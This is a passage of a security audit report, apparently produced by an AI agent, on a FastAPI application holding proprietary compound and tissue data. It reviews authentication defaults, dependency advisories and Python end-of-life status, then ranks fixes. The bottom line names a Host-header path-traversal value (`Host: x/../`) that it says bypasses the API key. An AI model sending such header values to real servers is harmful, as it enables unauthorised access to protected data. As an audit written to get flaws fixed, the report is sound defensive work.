7. **No `debug=True`, and `--reload` is not in any shipped config.** `FastAPI(...)` at
   `api.py:1391-1396` takes no `debug` kwarg. `--reload` exists as an opt-in flag
   (`__main__.py:37`) but `Dockerfile:82,87` uses `ENTRYPOINT ["python","-m","app.server"]` /
   `CMD ["--host","0.0.0.0","--port","8000"]` without it. No custom exception handler is
   registered, so an unhandled 500 returns Starlette's plain body with no traceback.
8. **No application log file on disk.** No `logging.basicConfig`, no `FileHandler` anywhere in
   `app/server/`. Job logs are per-job in-memory ring buffers (`_LOG_MAXLEN = 500`); the
   disclosure risk is via HTTP (H1b), not via a forgotten log file. No `print()` in any request
   path. uvicorn's access log records method + path only, and compound data travels in POST
   bodies, so it does not reach access logs.
9. **Auth exists and its default is documented.** Answering item 4 plainly: there **is**
   authentication — a shared-secret `X-API-Key` gate on `/api/*` (`api.py:1413-1423`) — and it
   is **off by default on loopback and auto-generated for any non-loopback bind**
   (`__main__.py:60-71`), so the server cannot come up silently unauthenticated on a network
   address. `docs/DEPLOYMENT.md` states the three modes explicitly and is unusually candid
   about what the shared key is and is not (§1b, "One shared secret... put an auth proxy in
   front rather than extending this"). **The design choice is stated.** The problem is not the
   choice; it is that C2's wildcard CORS voids the loopback assumption it rests on, and C1 nullifies
   the key itself in the networked mode.

---

# Dependencies

`pip list` on the venv (Python 3.9.6). Installed versions of the security-relevant packages:

```
fastapi 0.128.8    starlette 0.49.3   uvicorn 0.39.0    pydantic 2.13.4
pillow 11.3.0      numpy 2.0.2        scipy 1.13.1      requests 2.32.5
urllib3 2.6.3      rdkit 2025.9.2     cryptography 50.0.0   PyYAML 6.0.3
```

`python-multipart`, `jinja2`, and `aiohttp` are **not installed** — confirmed. The absence of
`python-multipart` is the direct cause of the hand-rolled parser in H3, and is a deliberate
contract decision (`protocol_api.py:408-412`).

`pip-audit` is not installed and was not installed. Instead every installed version was
queried against the **OSV.dev API**, which performs range-matching server-side — so each
advisory below is confirmed to include the installed version.

### The one that matters: starlette 0.49.3 → see C1

**GHSA-86qp-5c8j-p5mr / CVE-2026-48710** is not a theoretical pin. It is the authentication
bypass promoted to **C1**, verified working against this exact installed version. Four further
Starlette advisories match:

| Advisory | CVE | Fixed in | Issue |
|---|---|---|---|
| GHSA-86qp-5c8j-p5mr | CVE-2026-48710 | 1.0.1 | **Host header poisons `request.url.path` → path-based auth bypass — see C1** |
| GHSA-jp82-jpqv-5vv3 | CVE-2026-54282 | 1.3.0 | Unvalidated path concatenated into authority, poisons `request.url.hostname` |
| GHSA-x746-7m8f-x49c | CVE-2026-48817 | 1.1.0 | Arbitrary HTTP method dispatched to `HTTPEndpoint` attributes via `getattr` |
| GHSA-wqp7-x3pw-xc5r | CVE-2026-48818 | 1.1.0 | SSRF + NTLM credential theft via UNC paths in `StaticFiles` (Windows only — not applicable here) |
| GHSA-82w8-qh3p-5jfq | CVE-2026-54283 | 1.3.1 | `request.form()` limits silently ignored (DoS) |

Fixes are in the **1.x** line — a major-version jump needing FastAPI coordination. **Do not
wait for it:** the code-level fixes in C1 close the bypass immediately.

### Other verified Python advisories

| Package | Installed | Fixed in | Assessment |
|---|---|---|---|
| **urllib3** | 2.6.3 | 2.7.0 | GHSA-qccp-gfcp-xxvc (sensitive headers forwarded cross-origin on proxied redirects — credential-leak class); GHSA-mf9v-mfxr-j63j (decompression-bomb bypass). Worth doing. |
| **requests** | 2.32.5 | 2.33.0 | GHSA-gc5v-m9x4-r6x2 — insecure temp-file reuse in `extract_zipped_paths()`. Low reachability. |
| **pip** | 26.0.1 | 26.1.2 | GHSA-wf93-45jw-7689 path traversal in entry-point names, +2. **Install-time** risk only. |
| **setuptools** | 82.0.1 | 83.0.0 | GHSA-h35f-9h28-mq5c — `MANIFEST.in` bypass could ship excluded files in an sdist. Only if you publish sdists. |
| **pyarrow** | 21.0.0 | 23.0.1 | GHSA-rgxp-2hwp-jwgg use-after-free — needs untrusted Arrow IPC input. Not reachable here. |
| **pypdf** | 6.14.2 | 6.15.0 | Two DoS advisories; needs untrusted PDFs. Not reachable here. |
| **pytest** | 8.4.2 | 9.0.3 | CVE-2025-71176, dev-only. |

### Pillow 11.3.0 — 18 advisories, but **not reachable in this product**

OSV matches 18 advisories against pillow 11.3.0, several memory-corruption class
(CVE-2026-55798 OS command injection in `WindowsViewer`; heap OOB writes in `Image.paste`,
`ImageCmsTransform.apply`, `RankFilter`), all cleared by **12.3.0**.

**I checked reachability before ranking this, and it is not reachable.** There is no
`import PIL` anywhere in `app/` or `tmesim/` — the only grep hits for "PIL" are the substring
inside the words "COM**PIL**ED", "SELF-COM**PIL**ED" and "CA**PIL**LARY". Pillow is a
transitive dependency of matplotlib/scikit-image, and **no user-supplied image reaches it**:
the upload allowlist (`protocol_api.py:55`) is `.smi/.mol/.sdf/.json/.yaml/.yml` only, and
tissue data is read through `tifffile`/`imagecodecs`, not PIL.

So: **upgrade it as hygiene, not as an incident.** It is a genuine 18-advisory pin, but it is
not on a path an attacker can reach, and it should not displace C1–C3 or H1–H3 in the queue.

### Verified CLEAN (a real result)

**fastapi 0.128.8, cryptography 50.0.0, PyYAML 6.0.3, uvicorn 0.39.0, pydantic 2.13.4,
numpy 2.0.2, scipy 1.13.1** — all clean against the installed versions. Also clean: certifi,
httpx, h11, httpcore, playwright, pandas, matplotlib, scikit-learn, scikit-image, tifffile,
imagecodecs, h5py, openpyxl, xlrd, networkx, joblib, Pygments, wheel.

**Confirmed absent:** tornado, werkzeug, flask, django, lxml, gitpython, transformers, jinja2,
aiohttp, python-multipart.

**Unverified — not a vulnerability claim, just uncovered:** `pdfminer.six 20251107` (OSV query
failed on name normalization) and `rdkit 2025.9.2` (no OSV PyPI entry; rdkit advisories
historically sit outside that ecosystem). Worth a manual look given rdkit parses user SMILES.

### Python 3.9.6 — verified (supports M6)

Python 3.9 reached **end-of-life 2025-10-31** (python.org devguide); as of August 2026 it is
~9.5 months past EOL and will receive no further CPython security fixes. 3.9.6 shipped
2021-06-28; the series ended at 3.9.25, so this venv is **19 patch releases behind**.

One honest caveat: the base interpreter is Apple's Command Line Tools Python, and Apple
backports some fixes without changing the `3.9.6` version string — so "19 behind" is accurate
against upstream CPython but the effective gap cannot be determined from here. The conclusion
is unchanged: an EOL branch with no published CVE-to-build mapping should not be the base for
this venv. Move to 3.12/3.13.

## Node — `landing-3d/`, verified

`npm audit` ran cleanly against the committed `package-lock.json`. Result: **6 high severity,
0 critical.** `next` is pinned at **16.2.12**, react 19.2.4, three ^0.185.1. Advisory IDs are
npm's own output, not my attribution:

| Package | Advisory | Nature |
|---|---|---|
| `postcss` (via `next`) | GHSA-6g55-p6wh-862q, GHSA-fxqj-rqcc-2cmp, GHSA-r28c-9q8g-f849, GHSA-qx2v-qp2m-jg93 | Arbitrary `.map` file read / path traversal via attacker-controlled `sourceMappingURL`; XSS via unescaped `</style>` |
| `sharp` (via `next`) | GHSA-f88m-g3jw-g9cj (CVE-2026-33327/33328/35590/35591) | Inherited libvips image-decoding vulnerabilities |
| `brace-expansion` | GHSA-mh99-v99m-4gvg, GHSA-rgw5-rvv9-x895 | DoS, unbounded expansion → OOM |
| `js-yaml` | GHSA-5p4m-2wfm-xmqj | Quadratic CPU consumption in `!!omap` |
| `nanoid` | GHSA-2v37-7h3g-55p8 | Infinite loop when `size` is zero |

**Assessment.** These are overwhelmingly **build-time and dev-server** exposures for a static
marketing site — the `postcss` and `sharp` issues bite when processing attacker-supplied CSS
or images, which for `landing-3d/` means content the team authors, not visitor input. None of
them touches the Studio backend or proprietary data. So: **not a field-test blocker**, but
worth clearing before the marketing site ships.

`brace-expansion`, `js-yaml` and `nanoid` are fixable in place:

```bash
cd landing-3d && npm audit fix
```

`postcss` and `sharp` are transitive under `next` and npm reports the fix as
`next@16.3.1`, "outside the stated dependency range" — i.e. `npm audit fix --force` performs a
**minor `next` upgrade**. Do that deliberately and re-verify the 3D scroll experience rather
than running `--force` blind; siblings are actively editing `landing-3d/` right now.

---

# Bottom line

**Not safe to expose to external field testers as-is.** Four things must land first:

1. **C1** — `Host: x/../` walks straight past the API key. Verified working on the installed
   Starlette. This is the one to fix today: it means the networked, key-protected deployment a
   field test would run has, in practice, no authentication at all. The code fix is two lines
   and does not require the major-version Starlette upgrade.
2. **C2** — wildcard CORS with no default auth. Any page the operator browses reads and
   deletes the compound library in the default loopback mode.
3. **C3** — a browser profile in pushed git history. Needs a history rewrite and session
   rotation; the longer it sits, the more clones carry it.
4. **H1 + H2** — unpublished SMILES sitting in world-readable files, echoed into
   client-visible job logs, and baked into every Docker image.

C1 and C2 compose badly: C1 removes the key in the networked mode, C2 removes the
same-origin barrier in the local mode. Between them there is no configuration of this product
that currently protects the compound store.

**H3** and **H5** should follow immediately — both are one unauthenticated request away from
taking the host down.

One scoping point worth escalating beyond engineering: `docs/DEPLOYMENT.md:9-14` explicitly
places "any use involving real, identifiable patient data" **outside** what the deployment
guidance covers, on the stated grounds that every shipped dataset is open public research data
with no patient-identifiable information. The field test described in this audit's brief —
operators' proprietary compounds and patient-derived tissue sections — is exactly the case the
document excludes. That is a documentation/governance gap to close deliberately, not a bug to
patch: either the doc's scope expands with a real review behind it, or the field test is
scoped to match the doc.
